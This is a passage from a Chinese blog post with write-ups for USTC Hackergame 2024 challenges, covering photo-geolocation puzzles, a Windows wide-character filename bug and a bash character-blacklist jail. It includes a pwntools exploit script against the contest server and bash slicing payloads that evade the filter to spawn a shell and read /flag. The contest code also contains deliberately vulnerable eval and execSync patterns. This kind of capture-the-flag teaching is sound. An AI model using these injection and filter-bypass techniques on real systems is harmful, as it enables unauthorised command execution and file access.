你们也去。我怎么一天到晚都在上班啊，你们那到底是怎么弄的呀？教教我行不行</p></blockquote><p><img src="https://raw.githubusercontent.com/USTC-Hackergame/hackergame2024-writeups/refs/heads/master/official/%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87%204.0/photos/klkq.jpg" style="zoom: 50%;"></p></blockquote><p><del>出去玩的最多的难道不就是您自己吗？</del></p><p>看样子学长是受到了什么刺激…… 会是什么呢？话说照片里这是…… Leo 酱？……什么时候</p></div></details><p><strong>问题 1: 照片拍摄的位置距离中科大的哪个校门更近？（格式：</strong><code>X校区Y门</code><strong>，均为一个汉字）</strong></p><p>科大学生直接秒答。东校区西门</p><p><strong>问题 2: 话说 Leo 酱上次出现在桁架上是……科大今年的 ACG 音乐会？活动日期我没记错的话是？（格式：</strong><code>YYYYMMDD</code><strong>）</strong></p><p>搜到<a href="https://www.bilibili.com/opus/930934582351495204">网页</a>，得到答案为20240519。</p><hr><details class="toggle" ><summary class="toggle-button" style="">诶？我带 LEO 酱出去玩？真的假的？</summary><div class="toggle-content"><p>「拍照的时候带着 LEO 酱看起来是个不错的选择」，回忆完上次的 ACG 音乐会，你这样想到，不过说到底要去哪里呢？</p><p>这样想着，你打开自己的相册翻找，「我记得之前保存了几个还不错的地方……」</p><p><img src="https://github.com/USTC-Hackergame/hackergame2024-writeups/raw/master/official/%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87%204.0/photos/image01.jpg" style="zoom: 50%;"></p><p><img src="https://github.com/USTC-Hackergame/hackergame2024-writeups/raw/master/official/%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87%204.0/photos/image04.jpg" style="zoom: 50%;"></p><p>嗯？奇怪的记忆增加了。诶，我到过这些地方吗？</p></div></details><p><strong>问题 3: 这个公园的名称是什么？（不需要填写公园所在市区等信息）</strong></p><p>这题直接搜图似乎是真搜不到什么东西，不过我一下就注意到了垃圾桶上的“六安园林”四个字，一开始以为这就是公园名（忘了placeholder上的内容）。</p><p>然后我注意到路上有一条彩虹线条，遂搜索：六安 彩虹跑道。搜到<a href="https://www.sohu.com/a/498872898_100023473">网页</a>，对比了一下三种颜色的排列，发现应该是对的，得到答案为：中央公园。</p><p><strong>问题 4: 这个景观所在的景点的名字是？（三个汉字）</strong></p><p>直接搜图即可，搜到三峡截流石，再顺着这个线索一通搜索三个字的景区，搜到：坛子岭。</p><hr><details class="toggle" ><summary class="toggle-button" style="">尤其是你才是最该多练习的人</summary><div class="toggle-content"><p>调查自己还是头一回，多新鲜啊。不过，还没来得及理清头绪，你突然收到了来自学长的信息：</p><blockquote><p><img src="https://github.com/USTC-Hackergame/hackergame2024-writeups/raw/master/official/%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87%204.0/photos/image06.jpg" style="zoom: 50%;"><br>来练练手，看看能挖出什么有趣的东西。</p></blockquote><p>糟了，三番五次调查学长被他发现了？不过，这个照片里的车型是……</p></div></details><p><strong>问题 5: 距离拍摄地最近的医院是？（无需包含院区、地名信息，格式：XXX医院）</strong></p><p>没看题目提示，直接注意到左下角的那个车的车身带粉色刷漆，搜索“动车 粉色”，直接搜到<a href="https://www.sohu.com/a/823020940_121117452">网页</a>，于是先出下一问答案：CRH6F-A</p><p>然后搜了一下这班列车的经停站：</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/8c18546e-bb3c-44a5-8e33-2d6edd77558c.png" alt="image-20241109142626373" style="zoom:50%;" /></p><p>好像也不多？手动一个一个试过来，发现清河站附近的一个医院：积水潭医院，符合要求。</p><p><strong>问题 6: 左下角的动车组型号是？</strong></p><p>如上：CRH6F-A</p><hr><h2 id="不宽的宽字符"><a href="#不宽的宽字符" class="headerlink" title="不宽的宽字符"></a>不宽的宽字符</h2><details class="toggle" ><summary class="toggle-button" style="">查看题面</summary><div class="toggle-content"><div class="note primary simple"><p>A 同学决定让他设计的 Windows 程序更加「国际化」一些，首先要做的就是读写各种语言写下的文件名。于是他放弃 C 语言中的 <code>char</code>，转而使用宽字符 <code>wchar_t</code>，显然这是一个国际化的好主意。</p><p>经过一番思考，他写出了下面这样的代码，用来读入文件名：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Read the filename</span>std<span class="token double-colon punctuation">::</span>wstring filename<span class="token punctuation">;</span>std<span class="token double-colon punctuation">::</span><span class="token function">getline</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>wcin<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>转换后要怎么打开文件呢？小 A 使用了 C++ 最常见的写法：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Create the file object and open the file specified</span>std<span class="token double-colon punctuation">::</span>wifstream <span class="token function">f</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可惜的是，某些版本的 C++ 编译器以及其自带的头文件中，文件名是 <code>char</code> 类型的，因此这并不正确。这时候小 A 灵光一闪，欸🤓👆，我为什么不做一个转换呢？于是：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">std<span class="token double-colon punctuation">::</span>wifstream <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>随便找了一个文件名测试过无误后，小 A 对自己的方案非常自信，大胆的在各个地方复用这段代码。然而，代价是什么呢？</p><hr><p>现在你拿到了小 A 程序的一部分，小 A 通过在文件名后面加上一些内容，让你不能读取藏有 flag 的文件。</p><p>你需要的就是使用某种输入，读取到文件 <code>theflag</code> 的内容（完整位置是：<code>Z:\theflag</code>）。</p><blockquote><p>注：为了使得它能在一些系统上正确地运行，我们使用 Docker 作了一些封装，并且使用 WinAPI 来保证行为一致，不过这并不是题目的重点。</p></blockquote><p><a href="https://github.com/USTC-Hackergame/hackergame2024-writeups/raw/refs/heads/master/official/%E4%B8%8D%E5%AE%BD%E7%9A%84%E5%AE%BD%E5%AD%97%E7%AC%A6/files/what_if_wider.zip">本题附件</a></p></div></div></details><p>题目源码如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fstream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cctype></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    std<span class="token double-colon punctuation">::</span>wcout <span class="token operator">&lt;&lt;</span> L<span class="token string">"Enter filename. I'll append 'you_cant_get_the_flag' to it:"</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>    <span class="token comment">// Get the console input and output handles</span>    HANDLE hConsoleInput <span class="token operator">=</span> <span class="token function">GetStdHandle</span><span class="token punctuation">(</span>STD_INPUT_HANDLE<span class="token punctuation">)</span><span class="token punctuation">;</span>    HANDLE hConsoleOutput <span class="token operator">=</span> <span class="token function">GetStdHandle</span><span class="token punctuation">(</span>STD_OUTPUT_HANDLE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>hConsoleInput <span class="token operator">==</span> INVALID_HANDLE_VALUE <span class="token operator">||</span> hConsoleOutput <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token comment">// Handle error – we can't get input/output handles.</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    DWORD mode<span class="token punctuation">;</span>    <span class="token function">GetConsoleMode</span><span class="token punctuation">(</span>hConsoleInput<span class="token punctuation">,</span> <span class="token operator">&amp;</span>mode<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">SetConsoleMode</span><span class="token punctuation">(</span>hConsoleInput<span class="token punctuation">,</span> mode <span class="token operator">|</span> ENABLE_PROCESSED_INPUT<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Buffer to store the wide character input</span>    <span class="token keyword">char</span> inputBuffer<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    DWORD charsRead <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment">// Read the console input (wide characters)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ReadFile</span><span class="token punctuation">(</span>hConsoleInput<span class="token punctuation">,</span> inputBuffer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>inputBuffer<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>charsRead<span class="token punctuation">,</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token comment">// Handle read error</span>        <span class="token keyword">return</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// Remove the newline character at the end of the input</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>charsRead <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> inputBuffer<span class="token punctuation">[</span>charsRead <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> L<span class="token char">'\n'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        inputBuffer<span class="token punctuation">[</span>charsRead <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> L<span class="token char">'\0'</span><span class="token punctuation">;</span> <span class="token comment">// Null-terminate the string</span>        charsRead<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// Convert to WIDE chars</span>    <span class="token keyword">wchar_t</span> buf<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">MultiByteToWideChar</span><span class="token punctuation">(</span>CP_UTF8<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> inputBuffer<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">wchar_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>wstring filename <span class="token operator">=</span> buf<span class="token punctuation">;</span>    <span class="token comment">// Haha!</span>    filename <span class="token operator">+=</span> L<span class="token string">"you_cant_get_the_flag"</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>wifstream file<span class="token punctuation">;</span>    file<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>filename<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">is_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        std<span class="token double-colon punctuation">::</span>wcout <span class="token operator">&lt;&lt;</span> L<span class="token string">"Failed to open the file!"</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    std<span class="token double-colon punctuation">::</span>wstring flag<span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span><span class="token function">getline</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>wcout <span class="token operator">&lt;&lt;</span> L<span class="token string">"The flag is: "</span> <span class="token operator">&lt;&lt;</span> flag <span class="token operator">&lt;&lt;</span> L<span class="token string">". Congratulations!"</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不是很看得懂一些函数是在干什么，但通过拷问GPT，以及查找各种文档，发现其实所谓的“宽字符”就是把相邻两个普通字符的ascii码分为低位和高位拼在一起，作为一整个字符处理。而反过来把宽字符转为普通字符的时候则是做相反操作，并且C语言的<code>char*</code>是检测到<code>\x0</code>就直接截断了。</p><p>那么小A在后面拼的这一串<code>you_cant_get_the_flag</code>起到了什么作用呢？我反正没看出来。</p><p>于是写出脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> remoteascii_bytes <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token number">0x5A</span><span class="token punctuation">,</span>  <span class="token comment"># 'Z'</span>    <span class="token number">0x3A</span><span class="token punctuation">,</span>  <span class="token comment"># ':'</span>    <span class="token number">0x2f</span><span class="token punctuation">,</span>  <span class="token comment"># '/'</span>    <span class="token number">0x2f</span><span class="token punctuation">,</span>  <span class="token comment"># '/'</span>    <span class="token number">0x74</span><span class="token punctuation">,</span>  <span class="token comment"># 't'</span>    <span class="token number">0x68</span><span class="token punctuation">,</span>  <span class="token comment"># 'h'</span>    <span class="token number">0x65</span><span class="token punctuation">,</span>  <span class="token comment"># 'e'</span>    <span class="token number">0x66</span><span class="token punctuation">,</span>  <span class="token comment"># 'f'</span>    <span class="token number">0x6C</span><span class="token punctuation">,</span>  <span class="token comment"># 'l'</span>    <span class="token number">0x61</span><span class="token punctuation">,</span>  <span class="token comment"># 'a'</span>    <span class="token number">0x67</span>   <span class="token comment"># 'g'</span><span class="token punctuation">]</span>wchar_values <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ascii_bytes<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    low_byte <span class="token operator">=</span> ascii_bytes<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    high_byte <span class="token operator">=</span> ascii_bytes<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">if</span> i<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ascii_bytes<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token number">0x00</span>    wchar <span class="token operator">=</span> <span class="token punctuation">(</span>high_byte <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> low_byte    wchar_values<span class="token punctuation">.</span>append<span class="token punctuation">(</span>wchar<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>wchar<span class="token punctuation">)</span> <span class="token keyword">for</span> wchar <span class="token keyword">in</span> wchar_values<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'202.38.93.141'</span><span class="token punctuation">,</span> <span class="token number">14202</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'token: \n'</span><span class="token punctuation">,</span> <span class="token string">b'TOKEN'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"I'll append 'you_cant_get_the_flag' to it:\r\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一开始试了<code>Z:\theflag</code>，然而没过，然后把反斜杠换成了两个正斜杠就过了。</p><p>所以这题小A到底试了什么文件名可以「测试过无误」的？</p><hr><h2 id="PowerfulShell"><a href="#PowerfulShell" class="headerlink" title="PowerfulShell"></a>PowerfulShell</h2><details class="toggle" ><summary class="toggle-button" style="">查看题面</summary><div class="toggle-content"><div class="note primary simple"><p>即使贝壳早已破碎，也请你成为 PowerfulShell 之王。</p><details><summary>题目核心逻辑预览（点击展开）</summary><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token assign-left variable">FORBIDDEN_CHARS</span><span class="token operator">=</span><span class="token string">"'<span class="token entity" title="\&quot;">\"</span>;,.%^*?!@#%^&amp;()>&lt;\/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0"</span><span class="token function-name function">PowerfulShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token keyword">do</span>        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-n</span> <span class="token string">'PowerfulShell@hackergame> '</span>        <span class="token keyword">if</span> <span class="token operator">!</span> <span class="token builtin class-name">read</span> input<span class="token punctuation">;</span> <span class="token keyword">then</span>            <span class="token builtin class-name">echo</span> <span class="token string">"EOF detected, exiting..."</span>            <span class="token builtin class-name">break</span>        <span class="token keyword">fi</span>        <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$input</span> <span class="token operator">=~</span> <span class="token punctuation">[</span><span class="token variable">$FORBIDDEN_CHARS</span><span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>            <span class="token builtin class-name">echo</span> <span class="token string">"Not Powerful Enough :)"</span>            <span class="token builtin class-name">exit</span>        <span class="token keyword">else</span>            <span class="token builtin class-name">eval</span> <span class="token variable">$input</span>        <span class="token keyword">fi</span>    <span class="token keyword">done</span><span class="token punctuation">&#125;</span>PowerfulShell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></details><p>flag 位于根目录 <code>/</code> 下。</p></div></div></details><p>很有意思的题，但我平时写<code>bash</code>写少了，对它的很多特性不太了解，因此卡到了第四天才解出这题。</p><p>在看源码之前我一直以为这是个<code>Powershell</code>题，比起<code>bash</code>，<code>Powershell</code>我就更不会了，因此我前两天根本没看这题。</p><p>然后我发现是个<code>bash</code>，那似乎还能做一下。</p><p>发现这题就是把很多字符都ban了，需要我们用仅剩的几个字符去运行起来<code>cat /flag</code>。</p><p>我一开始搜“execute bash without letters”，搜到了<a href="https://www.reddit.com/r/hacking/comments/1bdjg9z/linux_shell_escape_execute_commands_without/">这个网页</a>。</p><p>发现楼主似乎在骗picoCTF的思路，笑死。</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/7d2a6405-7aad-4e76-9473-5ac2f8f69fbe.png" alt="image-20241109144024043" style="zoom:50%;" /></p><p>楼主表示可以用下面这个字符串代替命令<code>ls</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">$'<span class="token entity" title="\154">\154</span>'</span><span class="token string">$'<span class="token entity" title="\163">\163</span>'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不过我们的题目ban了单引号，所以这个方法走不通。</p><p>然后我查了一下这个picoCTF的题，发现和我们这个题还是有点区别，限制的字符少了许多。</p><p>最后我开始翻<code>bash</code>特殊指令的文档（话说不应该一开始就这么做吗），发现<code>bash</code>可以用美元符号、花括号、冒号实现字符串切片，格式大概是这样：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$&#123;s<span class="token operator">:</span>start<span class="token operator">:</span>length&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而很巧的是，这些符号都没被ban，然后我试了一下没被ban的另一个很有用的符号：<code>~</code>，发现它的输出是：<code>/players</code></p><p><img src="https://blogfiles.oss.fyz666.xyz/png/bd23934b-52e8-4d6b-a1c5-dbcab16345e8.png" alt="image-20241109144753976" style="zoom:50%;" /></p><p>那就有思路了！由于下划线可以随便用，我们相当于拥有了定义变量的能力，于是可以先把<code>~</code>的输出结果存到双下划线变量里：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">__</span><span class="token operator">=~</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后<code>__</code>这个变量就等于了<code>/players</code>，通过对这个变量的切片，我们可以得到命令<code>ls</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$&#123;__<span class="token operator">:</span>2<span class="token operator">:</span>1&#125;</span><span class="token variable">$&#123;__<span class="token operator">:</span>7<span class="token operator">:</span>1&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行一下命令发现当前路径下有且只有一个文件：</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/7e160bc9-2037-4a9e-9f2c-f779de1c9738.png" alt="image-20241109144825612" style="zoom:50%;" /></p><p>注意到这个输出有一个英文句号，我一开始还想着用<code>ls</code>去看看上级目录有啥，但转念一想，直接取最后两个字符，这不就直接拿到shell了，还费别的啥劲？于是：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">__</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$<span class="token punctuation">&#123;</span>__:2:1<span class="token punctuation">&#125;</span>$<span class="token punctuation">&#123;</span>__:7:1<span class="token punctuation">&#125;</span><span class="token variable">`</span></span><span class="token variable">$&#123;__<span class="token operator">:</span>14<span class="token operator">:</span>2&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这样就绕过了字符限制，直接<code>cat /flag</code>即可：</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/0b0baee3-7626-4ed6-85fb-4056bc90e8b7.png" alt="image-20241109145214629" style="zoom:50%;" /></p><h2 id="Node-js-is-Web-Scale"><a href="#Node-js-is-Web-Scale" class="headerlink" title="Node.js is Web Scale"></a>Node.js is Web Scale</h2><details class="toggle" ><summary class="toggle-button" style="">查看题面</summary><div class="toggle-content"><div class="note primary simple"><p>小 Q 最近在写 Node.js，需要一个键值数据库来存储数据。</p><p><del>众所周知</del>，其他的数据库无论如何都需要 write to disk，所以它们 don’t scale。直接写到 <code>/dev/null</code> 嘛，虽然性能很好，但是好像就拿不到写入的数据了。基于这个想法，小 Q 利用最新最热的<del>还没跑路的</del>大语言模型，生成了一段内存数据库的 Node.js 代码，绝对 web scale！</p><details><summary>服务端代码（点击展开）</summary><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// server.js</span><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"express"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"body-parser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"path"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> execSync <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">"public"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> cmds <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">getsource</span><span class="token operator">:</span> <span class="token string">"cat server.js"</span><span class="token punctuation">,</span>  <span class="token literal-property property">test</span><span class="token operator">:</span> <span class="token string">"echo 'hello, world!'"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">let</span> store <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// GET /api/store - Retrieve the current KV store</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/api/store"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span>store<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// POST /set - Set a key-value pair in the store</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/set"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> key<span class="token punctuation">,</span> value <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>  <span class="token keyword">const</span> keys <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">let</span> current <span class="token operator">=</span> store<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> keys<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> key <span class="token operator">=</span> keys<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>current<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      current<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    current <span class="token operator">=</span> current<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span 